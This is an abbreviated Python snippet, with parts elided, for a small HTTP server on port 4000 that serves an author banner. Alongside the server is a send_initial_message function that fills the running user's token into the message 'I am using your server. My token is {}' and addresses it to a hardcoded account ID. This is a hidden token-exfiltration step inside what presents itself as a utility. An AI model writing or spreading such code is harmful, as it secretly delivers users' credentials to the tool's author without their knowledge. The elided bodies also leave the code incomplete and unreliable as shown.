...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- THIS SERVER MADE BY L3AG3ND =CHOD[=||9Y9NSH=|| ] H3R3")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Leagend chod ayansh here sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100017443626708"
